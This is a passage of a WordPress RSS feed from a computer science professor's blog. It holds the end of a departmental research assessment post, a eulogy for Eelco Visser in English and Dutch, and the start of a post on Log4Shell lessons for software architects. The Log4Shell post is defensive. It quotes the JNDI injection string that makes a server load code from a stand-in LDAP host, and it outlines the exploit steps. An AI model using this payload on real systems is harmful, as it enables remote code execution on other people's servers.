+<p>In view of (c), our organization, we embrace open science, with a substantial percentage (80% in 2020) of our articles available as open access, and by making numerous software tools and data sets openly available. We are a highly international organization with employees and students from all over the world. We strive to be an inclusive organization, where staff and students feel at home and valued, regardless of their background, age, gender, sexual orientation or functional disability. In terms of female faculty, we realized a net growth from 11 to 14 faculty members. As the number of men employed also increased, the percentage of female faculty stayed stable at around 20%. We consider this too low. We are committed to addressing this, for which we will take a long-term approach with, amongst other means, dedicated budget reserved for continued openings for female faculty in the upcoming years.</p>
+
+
+
+<p>We are proud of our scientific successes and societal impact in the core computer science disciplines as well as in interdisciplinary research in our target societal sectors. This is especially so as those were achieved in a period that was transformational for TU Delft Computer Science, characterized by substantial growth and development across our organization and activities. We anticipate an even stronger societal demand for our research and expertise in the future. We will therefore continue to initiate, participate and take on a key role in effective and interdisciplinary partnerships at the university (TU Delft AI), regional (LDE), national (ICAI, IPN), and European (ELLIS, CLAIRE) levels. Furthermore, we will continue the growth path for our staff, in order to build up capacity enabling us to further develop our scientific excellence and offer our strongly increased student population the world-class research-intensive education they deserve. To achieve this, we center the next steps in our ongoing transformation around <em>people</em>, <em>organization</em>, and <em>profiling</em> and identify seven key actions for the upcoming years that aim at (1) improving our attractiveness as an employer; (2) improving diversity and inclusion; (3) improving the execution of the PhD program; (4) expanding our staff capacity; (5) aligning our office space with the optimal way of working; (6) articulating the scientific profile; and (7) boosting our scientific and societal impact.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/07/04/tu-delft-computer-science-research-assessment-2015-2020/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1485</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png" medium="image">
+			<media:title type="html">Self-assessment report</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=724" medium="image">
+			<media:title type="html">Arie van Deursen and Alan Hanjalic in the Computer Science building</media:title>
+		</media:content>
+	</item>
+		<item>
+		<title>Eelco Visser (1966-2022)</title>
+		<link>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-en/</link>
+					<comments>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-en/#comments</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Fri, 15 Apr 2022 16:19:47 +0000</pubDate>
+				<category><![CDATA[Research]]></category>
+		<category><![CDATA[eelco visser]]></category>
+		<category><![CDATA[eulogy]]></category>
+		<category><![CDATA[memoriam]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1449</guid>
+
+					<description><![CDATA[I stand in front of you, in total disbelief, as head of the department for which Eelco Visser has worked the last 15 years. I would like to offer you my perspective on Eelco&#8217;s significance, as a scientist, as a teacher, and as a person. Eelco and I got to know each other in 1992, [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-jetpack-markdown"><p><em>Text of the eulogy for Eelco Visser (12 October 1966 &#8211; 5 April 2022) at his farewell ceremony held in Leusden, April 2022. Original text in <a href="https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-nl">Dutch</a></em>.</p>
+</div>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://www.instagram.com/p/CcI34XUKTpg/?igshid=MDJmNzVkMjY="><img loading="lazy" data-attachment-id="1452" data-permalink="https://avandeursen.com/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small/" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" data-orig-size="683,675" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=640" src="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=683" alt="" class="wp-image-1452" width="292" height="289" srcset="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=292 292w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=584 584w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=150 150w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=300 300w" sizes="(max-width: 292px) 100vw, 292px" /></a><figcaption>December 2017</figcaption></figure>
+</div>
+
+
+<p>I stand in front of you, in total disbelief, as head of the department for which Eelco Visser has worked the last 15 years.</p>
+
+
+
+<p>I would like to offer you my perspective on Eelco&#8217;s significance, as a scientist, as a teacher, and as a person.</p>
+
+
+
+<p>Eelco and I got to know each other in 1992, thirty years ago.</p>
+
+
+
+<p>At the time, I was halfway my PhD in Amsterdam, working in the group of Paul Klint. Eelco was studying in Amsterdam, following Paul&#8217;s courses. These were so inspiring to Eelco that he decided to join Paul&#8217;s group, first to write his master&#8217;s thesis, and then to work on his PhD.</p>
+
+
+
+<p>It didn&#8217;t take long before Eelco and I had a connection. We had extensive discussions about research. The details don&#8217;t matter, and they didn&#8217;t really lead to concrete results. But thirty years later I still remember the substantive drive, the deep desire to profoundly understand a problem, the feeling to work on something <em>very</em> important, and, of course, Eelco&#8217;s tenacity.</p>
+
+
+
+<p>Eelco has been able to maintain that same drive for thirty years. Just like he knew how to inspire me, year after year he has inspired his students and his (international) peers &#8212; always driven by content, always persistent.</p>
+
+
+
+<p>This contributed to Eelco&#8217;s research being of the highest international level. Let me illustrate this through an award he received in 2020, a so-called <em>Most Influential Paper</em> award. This is an award you get ten years <em>after</em> publication, after it has been established that your paper actually had made the biggest impact.</p>
+
+
+
+<p>Eelco received this award for his article from 2010 on Spoofax, written with (then) PhD student Lennart Kats. Eelco was very proud of this award, and rightly so. In fact, he was so proud that he wrote a (long) blog post about it, entitled &#8220;<a href="https://eelcovisser.org/blog/2021/02/08/spoofax-mip/">A short history of the Spoofax language workbench</a>.&#8221;</p>
+
+
+
+<p>This &#8220;short history&#8221; starts in 1993 with Eelco&#8217;s PhD research in Amsterdam. Next, Eelco explains his journey, from Portland as a postdoc, via Utrecht as assistant professor, to Delft as associate and full professor. Each of these stops provides building blocks for the award-winning paper from 2010. And then, Eelco&#8217;s &#8220;short history&#8221; continues: He describes what his group in those ten years <em>after</em> the paper&#8217;s publication has done, and what good things he still has in store for the time to come.</p>
+
+
+
+<p>To me, this &#8220;short history&#8221; is signature Eelco:</p>
+
+
+
+<ul class="wp-block-list"><li>Visionary, working year after year on building blocks that all belong together</li><li>System-driven, with <em>working</em> software that he preferably contributes to himself</li><li>In a team, together with his PhD students, postdocs, engineers, students, and numerous international co-workers.</li></ul>
+
+
+
+<p>This short history also serves to illustrate the international side of Eelco&#8217;s work. He was very active, and loved, within international organizations like IFIP and ACM SIGPLAN. He succeeded in bringing the flagship <a href="https://2016.splashcon.org/">SPLASH</a> conference to Europe for the first time.</p>
+
+
+
+<p>And, naturally, Eelco had a vision on how to improve things: All those conferences putting effort in ad hoc web sites: There had to be a better way. And so, in line with his systems philosophy, he designed the <a href="https://conf.researchr.org/">CONF</a> system that has been up and running for ten years now. And he managed to convince hundreds of conferences to use his system, for a fee.</p>
+
+
+
+<p>Likewise, Eelco had a vision on education, and he knew how to realize it. In his opinion, programming education just had to be better. Thus, he designed a system, <a href="https://weblab.tudelft.nl/">WebLab</a>, which has also been in operation for almost 10 years now. And here too he managed to convince countless teachers to use his system.</p>
+
+
+
+<p>In addition, Eelco had a well-thought-out opinion about the courses that belong in a computer science program. So when we needed to revise our curriculum, Eelco was the perfect candidate to chair the associated committee. Eelco did this graciously, in a calm and persistent manner, reasoning from educational principles to settle disputes. The result is rock solid.</p>
+
+
+
+<p>Eelco&#8217;s education is well characterized by Willem-Paul Brinkman in the online Farewell Community: <em>Without maybe realizing it, many generations of Delft students will benefit from his teaching innovations</em>.</p>
+
+
+
+<p>Eelco was proud of his <a href="https://pl.ewi.tudelft.nl/">Programming Languages Group</a>. He built it up from scratch into an international top group. He took good care of his people, fighting for the best equipment and offices. As a member of the departmental management team, he fought for computer science in full, at faculty and university level. Nationally he was active in, for example, the Dutch National Association for Software Engineering <a href="https://www.versen.nl/">VERSEN</a>.</p>
+
+
+
+<p>And how was Eelco able to realize all this? What was his secret?</p>
+
+
+
+<p>Perhaps Eelco actually liked (a little) resistance. He was not afraid to disagree: after all, he had thought deeply about his opinion. And he was fine with being challenged: it was a sign that he was well on his way to breaking the status quo.</p>
+
+
+
+<p>Maybe not everyone always found this easy. But Eelco was also very friendly, and certainly willing to change his mind.</p>
+
+
+
+<p>And, Eelco was also patient: Big changes take time. If he saw that he had insufficient supporters, he could wait. Or, under the radar, start small in order to set his own plans in motion.</p>
+
+
+
+<p>How much we will miss Eelco in Delft! The visionary, the obstinate, the focus on the content, the love for computer science, the tenacity, and the attention for students and colleagues: exactly what we need so much in Delft.</p>
+
+
+
+<p>Let me conclude with a few words related to Corona and the lock down. The past few years, Eelco and I were in touch weekly, mostly within the departmental management team, but also often one-on-one. All online, from home. We discussed departmental matters, small and large, as well as the impact of Corona. On one thing we agreed: Being at home more, seeing more of your children, doing more with the family: we both experienced this as a gift.</p>
+
+
+
+<p>Due to the lock down, I don&#8217;t know when it was that I saw Eelco last in person. I think it was on October 14, at the PhD defense of Arjen Rouvoet. This was a beautiful day, and this is how I like to remember Eelco: Science at the highest level, international peers in substantive debate, a cum laude PhD defense, and Eelco happy, radiant in the midst of his PL group.</p>
+
+
+
+<p>Dear family, friends, colleagues, everyone: We will miss Eelco <em>very</em> much. Each of us has his or her own, wonderful memories of Eelco. Today is a day to hold on to that, and to share those memories with each other.</p>
+
+
+
+<p>I wish you all, and especially the family, all the best.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-en/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1449</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" medium="image">
+			<media:title type="html">1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=683" medium="image" />
+	</item>
+		<item>
+		<title>Eelco Visser (1966-2022)</title>
+		<link>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-nl/</link>
+					<comments>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-nl/#comments</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Fri, 15 Apr 2022 16:18:45 +0000</pubDate>
+				<category><![CDATA[Research]]></category>
+		<category><![CDATA[eelco visser]]></category>
+		<category><![CDATA[eulogy]]></category>
+		<category><![CDATA[memoriam]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1459</guid>
+
+					<description><![CDATA[Toespraak gehouden tijdens de uitvaartplechtigheid van Eelco Visser (12 oktober 1966 - 5 april 2022) op 12 april 2022 in Leusden]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-jetpack-markdown"><p><em>Toespraak gehouden tijdens de uitvaartplechtigheid van Eelco Visser (12 oktober 1966 &#8211; 5 april 2022) op 12 april 2022 in Leusden. <a href="https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-en">English</a> translation available.</em></p>
+</div>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://www.instagram.com/p/CcI34XUKTpg/?igshid=MDJmNzVkMjY="><img loading="lazy" data-attachment-id="1452" data-permalink="https://avandeursen.com/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small/" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" data-orig-size="683,675" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=640" src="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=683" alt="" class="wp-image-1452" width="284" height="280" srcset="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=284 284w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=568 568w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=150 150w, https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=300 300w" sizes="(max-width: 284px) 100vw, 284px" /></a><figcaption>December 2017</figcaption></figure>
+</div>
+
+
+<p>Ik sta hier, in totale verbijstering, als hoofd van de afdeling waar Eelco Visser de afgelopen 15 jaar gewerkt heeft.</p>
+
+
+
+<p>Ik wil U graag iets vertellen over de betekenis van Eelco, als wetenschapper, als docent, en als mens.</p>
+
+
+
+<p>Eelco en ik leerden elkaar kennen in 1992, dertig jaar geleden.</p>
+
+
+
+<p>Ik was toen halverwege mijn promotie in Amsterdam, en werkte in de groep van Paul Klint. Eelco studeerde toen in Amsterdam, en volgde colleges bij Paul. Die inspireerden hem zo dat hij zich aansloot bij Pauls groep om daar eerst af te studeren en later te promoveren.</p>
+
+
+
+<p>Eelco en ik hadden al snel een klik. We hadden uitgebreide discussies over onderzoek. De details doen er niet toe, en tot een echt resultaat hebben ze niet geleid. Maar dertig jaar later herinner ik me nog steeds de inhoudelijke drive, de wens om een probleem écht te snappen, het gevoel samen met iets héél belangrijks bezig te zijn, en natuurlijk Eelco&#8217;s vasthoudendheid.</p>
+
+
+
+<p>Diezelfde drive heeft Eelco dertig jaar vast weten te houden. Zoals hij mij wist te inspireren, heeft hij jaar in jaar uit zijn studenten, zijn promovendi, en zijn internationale collega&#8217;s aan zich weten te binden &#8212; altijd vanuit de inhoud, en altijd vasthoudend.</p>
+
+
+
+<p>Mede hierdoor was Eelco&#8217;s onderzoek van het hoogste internationale niveau. Laat ik dit illustreren aan de hand van een prijs die hij in 2020 ontving: een zogenaamde &#8220;Most Influential Paper&#8221; Award. Zo&#8217;n prijs krijg je pas als je artikel 10 jaar <em>na publicatie</em> de meeste invloed gehad bleek te hebben.</p>
+
+
+
+<p>Eelco kreeg die voor zijn artikel uit 2010 over Spoofax, met promovendus Lennart Kats. Eelco was hier, terecht, heel trots op. Zó trots, dat hij er een (lange) blog post over heeft geschreven, getiteld <em><a href="https://eelcovisser.org/blog/2021/02/08/spoofax-mip/">Een korte geschiedenis van de Spoofax taalwerkbank</a></em>.</p>
+
+
+
+<p>Deze &#8220;korte geschiedenis&#8221; begint in 1993 bij Eelco&#8217;s promotieonderzoek in Amsterdam. Vervolgens legt Eelco zijn reis uit, van Portland als postdoc, via Utrecht als universitair docent, naar Delft als hoofddocent en hoogleraar. Elk van deze tussenstops levert bouwstenen op voor het winnende paper uit 2010. En vervolgens gaat Eelco&#8217;s &#8220;korte geschiedenis&#8221; door: Hij beschrijft wat zijn groep in die tien jaar <em>na</em> het paper heeft gedaan, en wat voor moois hij nog in petto heeft voor de tijd die komen gaat.</p>
+
+
+
+<p>Wat mij betreft is deze &#8220;korte geschiedenis&#8221; Eelco ten voeten uit:</p>
+
+
+
+<ul class="wp-block-list"><li>visionair, jaar in jaar uit werkend aan bouwstenen die allemaal bij elkaar horen</li><li>systeem-gedreven, met <em>werkende</em> software systemen waar hij het liefst zelf aan meeprogrammeert</li><li>in team verband, samen met zijn promovendi, postdocs, engineers, studenten, en talloze internationale collega&#8217;s.</li></ul>
+
+
+
+<p>Deze korte geschiedenis laat ook iets zien over de internationale dimensie van Eelco&#8217;s werk. Hij was zeer actief, en geliefd, binnen internationale organisaties zoals IFIP en ACM SIGPLAN. Het lukte hem om het top-congres <a href="https://2016.splashcon.org/">SPLASH</a> voor het eerst naar Europa te halen.</p>
+
+
+
+<p>En natuurlijk had Eelco een visie hoe het beter kon: Al die congressen die hun web site in elkaar liepen te knutselen: dat <em>moest</em> efficiënter kunnen. En dus, in lijn met zijn systeem-filosofie, ontwierp hij het <a href="https://conf.researchr.org/">CONF</a> systeem dat nu al tien jaar in de lucht is. En wist hij honderden congressen te overtuigen zijn systeem, tegen betaling, te gebruiken.</p>
+
+
+
+<p>Ook op het gebied van onderwijs had Eelco een visie, en wist hij die te realiseren. Programmeeronderwijs moest beter, vond hij, en dus ontwierp hij een systeem, <a href="https://weblab.tudelft.nl/">WebLab</a>, dat nu ook al bijna 10 jaar in de lucht is. En ook hier wist hij talloze docenten te overtuigen zijn systeem te gebruiken.</p>
+
+
+
+<p>Daarnaast had Eelco een goed doordachte mening over welke vakken in een opleiding informatica thuis horen. Toen wij ons curriculum moesten herzien, was Eelco de perfecte kandidaat om de bijbehorende commissie voor te zitten. Eelco deed dit met verve, rustig en vasthoudend, redenerend vanuit onderwijskundige principes om geschillen te beslechten. Het resultaat staat als een huis.</p>
+
+
+
+<p>Voor Eelco&#8217;s onderwijs geldt wat Willem-Paul Brinkman in het online condoleance register schreef: &#8220;Zonder het misschien te beseffen, zullen vele generaties Delftse studenten profiteren van zijn onderwijsinnovaties.&#8221;</p>
+
+
+
+<p>Eelco was trots op zijn &#8220;<a href="https://pl.ewi.tudelft.nl/">Programming Languages Group</a>&#8220;. Hij heeft die uit het niets opgebouwd tot een internationale topgroep. Hij zorgde goed voor zijn mensen, en streed voor de beste apparatuur en werkplekken. Als lid van het management team van de afdeling, zette hij zich in voor informatica in de volle breedte, op facultair en universitair niveau. Ook landelijk was hij actief, onder meer in de Nederlandse Vereniging voor Software Engineering <a href="https://www.versen.nl/">VERSEN</a>.</p>
+
+
+
+<p>En hoe kreeg Eelco dit allemaal voor elkaar? Wat was zijn geheim?</p>
+
+
+
+<p>Misschien vond Eelco (een beetje) weerstand eigenlijk wel leuk. Hij was niet bang tegengas te geven: hij had tenslotte goed nagedacht over zijn mening. En hij vond het prima tegenstand te <em>krijgen</em>: dat was een teken dat hij goed op weg was de status quo te doorbreken.</p>
+
+
+
+<p>Misschien vond niet iedereen dit altijd even makkelijk. Maar Eelco was ook heel vriendelijk, en zeker bereid van mening te veranderen.</p>
+
+
+
+<p>En, Eelco was ook geduldig: Grootse veranderingen kosten tijd. Als hij zag dat hij onvoldoende medestanders had kon hij wachten. Of, onder de radar, alvast klein beginnen om zijn eigen plannen toch in gang te zetten.</p>
+
+
+
+<p>Wat zullen we Eelco missen in Delft. Het visionaire, het dwarse, de focus op de inhoud, de liefde voor het vak, de vasthoudendheid, en de aandacht voor student en collega: juist dat hebben we nodig in Delft.</p>
+
+
+
+<p>Ik wil afsluiten met een paar woorden naar aanleiding van Corona en de lockdown. De afgelopen twee jaar hadden Eelco en ik wekelijks contact, vooral binnen het management team van de afdeling, maar ook vaak 1-op-1, allemaal online, vanuit huis. We bespraken het reilen en zeilen van de afdeling, en de impact van Corona. Over één ding waren we het eens: Meer thuis zijn, meer zien van je kinderen, meer doen met het gezin: dit hebben we allebei als een geschenk ervaren.</p>
+
+
+
+<p>Door de lockdown weet ik niet wanneer ik Eelco voor het laatst echt gezien heb. Ik denk dat het 14 oktober was, bij de promotie van Arjen Rouvoet. Dat was een mooie dag, en zo herinner ik me Eelco graag: Wetenschap van het hoogste niveau, internationale collega&#8217;s in inhoudelijk debat, een cum laude promotie, en Eelco gelukkig, stralend temidden van zijn PL groep.</p>
+
+
+
+<p>Lieve familie, vrienden, collega&#8217;s, allemaal: We zullen Eelco zéér missen. Iedereen van ons heeft zijn of haar eigen, prachtige herinneringen aan Eelco. Vandaag is een dag om daaraan vast te houden, en om die herinneringen met elkaar te delen.</p>
+
+
+
+<p>Ik wens u allen, en in het bijzonder de familie, alle sterkte toe.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/04/15/eelco-visser-1966-2022-nl/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1459</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg" medium="image">
+			<media:title type="html">1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/04/1101_2017_12_19_tu_delft_moving_out_photo_ernst_van_deursen_small.jpeg?w=683" medium="image" />
+	</item>
+		<item>
+		<title>Log4Shell: Lessons Learned for Software Architects</title>
+		<link>https://avandeursen.com/2021/12/14/log4shell-lessons-learned-for-software-architects/</link>
+					<comments>https://avandeursen.com/2021/12/14/log4shell-lessons-learned-for-software-architects/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Tue, 14 Dec 2021 20:58:30 +0000</pubDate>
+				<category><![CDATA[Development]]></category>
+		<category><![CDATA[dependencies]]></category>
+		<category><![CDATA[log4j]]></category>
+		<category><![CDATA[open source]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[upgrading]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1428</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-jetpack-markdown"><p>This week, the <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">log4shell</a> vulnerability in the Apache <code>log4j</code> library was discovered (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-4428</a>).
+Exploiting this vulnerability is extremely simple, and <code>log4j</code> is used in many, many software systems that are critical to society &#8212; a lethal combination.
+What are the key lessons you  as a software architects can draw from this?</p>
+<h2>The vulnerability</h2>
+<p>In versions 2.0-2.14.1, the <code>log4j</code> library would take special action when logging messages containing &quot;<code>${jndi:ldap://LDAP-SERVER/a}</code>&quot;: it would lookup a Java class on the LDAP server mentioned, and execute that class.</p>
+<p>This should of course never have been a feature, as it is almost the definition of a remote code execution vulnerability. Consequently, the steps to <a href="https://twitter.com/cyb3rops/status/1469405846010572816">exploit</a> a target system are alarmingly simple:</p>
+<ol>
+<li>Create a nasty class that you would like to execute on your target;</li>
+<li>Set up your own LDAP server somewhere that can serve your nasty class;</li>
+<li>&quot;Attack&quot; your target by feeding it strings of the form &quot;<code>${jndi:ldap://LDAP-SERVER/a}</code>&quot; where ever possible &#8212; in web forms, search forms, HTTP requests, etc. If you&#8217;re lucky, some of this user input is logged, and just like that your nasty class gets executed.</li>
+</ol>
+<p>Interestingly, this recipe can also be used to make a running instance of a system immune to such attacks, in an approach dubbed <a href="https://github.com/Cybereason/Logout4Shell">logout4shell</a>: If your nasty class actually wants to be friendly, it can programmatically disable remote JNDI execution, thus safeguarding the system to any new attacks (until the system is re-started).</p>
+<p>The source code for <a href="https://github.com/Cybereason/Logout4Shell">logout4shell</a> is available on <a href="https://github.com/Cybereason/Logout4Shell">GitHub</a>: it also serves as an illustration of how extremely simple any attack will be.</p>
+<h2>Under attack</h2>
+<p>As long as your system is vulnerable, you should assume you or your customers are under attack:</p>
+<ol>
+<li>Depending on the type of information stored or services provided, (foreign) nation states may use the opportunity to collect as much (confidential) information as possible, or infect the system so that it can be accessed later;</li>
+<li>Ransomware &quot;entrepreneurs&quot; are delighted by the log4shell opportunity. No doubt their investments in an infrastructure to scan systems for this vulnerability and ensure future access to these systems will pay off.</li>
+<li>Insiders, intrigued by the simplicity of the exploit, may be tempted to explore systems beyond their access levels.</li>
+</ol>
+<p>All this calls for a system setup according to the highest security standards: deployments that are isolated as much as possible, access logs, and the ability to detect unwarranted changes (infections) to deployed systems.</p>
+<h2>Applying the Fix</h2>
+<p>Naturally, the new release of <code>log4j</code>, version 2.15, contains a fix.
+Thus, the direct solution for affected systems is to simply upgrade the <code>log4j</code> dependency to 2.15, and re-deploy the safe system as soon as possible.</p>
+<p>This may be more involved in some cases, due to backward incompatibilities that may have been introduced. For example, in version 2.13 support for Java 7 was stopped. So if you&#8217;re still on Java 7, just upgrading <code>log4j</code> is not as simple (and you may have other security problems than just <code>log4shell</code>). If you&#8217;re still stuck with log4j 1.x (end-of-life since 2015), then <code>log4shell</code> isn&#8217;t a problem, but you have other <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2031667">security problems</a> instead.</p>
+<p>Furthermore, <code>log4j</code> is widely used in other libraries you may depend on, such as <a href="https://github.com/apache/flink/pull/18077">Apache Flink</a>, <a href="https://flink.apache.org/2021/12/10/log4j-cve.html">Apache SOLR</a>, <a href="https://community.neo4j.com/t/log4j-cve-mitigation-for-neo4j/48856">neo4j</a>, <a href="https://github.com/elastic/elasticsearch/pull/81629">Elastic Search</a>, or Apache <a href="https://struts.apache.org/announce-2021#a20211212-2">Struts</a>: See the list of over <a href="https://github.com/NCSC-NL/log4shell/tree/main/software">150 affected systems</a>. Upgrading such systems may be more involved, for example if you&#8217;re a few versions behind or if you&#8217;re stuck with Java 7. Earlier, I described how upgrading a system using Struts, Srping, and Hibernate <a href="https://avandeursen.com/2012/11/11/library-updating-risk-it-now-or-risk-it-later/">took over two weeks</a> of work.</p>
+<p>All this serves as a reminder of the importance of <em>dependency hygiene</em>: the need to ensure dependencies are at their latest versions at all times. Upgrading versions can be painful in case of backward incompatibilities. This pain should be swallowed as early as possible, and not postponed until the moment an urgent security upgrade is needed.</p>
+<h2>Deploying the Fix</h2>
+<p>Deploying the fix yourself should be simple, and with an adequate continuous deployment infrastructure a simple push of a button or reaction to a commit.</p>
+<p>If your customers need to install an upgraded version of your system themselves, things may be harder. Here investements in a smooth update process pay off, as well a disciplined versioning approach that encourages customers to update their system regularly, without as little incompatibility roadblocks as possible.</p>
+<p>If your system is a library, you&#8217;re probably using <a href="https://semver.org/">semantic versioning</a>. Ideally, the upgrade&#8217;s only change is the upgrade of log4j, meaning your release can simply increment the patch version identifier. If necessary, you can consider backporting the patch to earlier major releases.</p>
+<h2>Your Open Source Stack</h2>
+<p>As illustrated by log4shell, most modern software stacks critically depend on open source libraries. If you benefit from open source, it imperative that you donate back. This can be in kind, by freeing your own developers to contribute to open source. A simpler approach may be to donate money, for example to the <a href="https://www.apache.org/foundation/contributing.html">Apache Software Foundation</a>. This can also buy you  influence, to make sure the open source libraries develop the features you want, or conduct the security audits that you  hope for.</p>
+<h2>The Role of the Architect</h2>
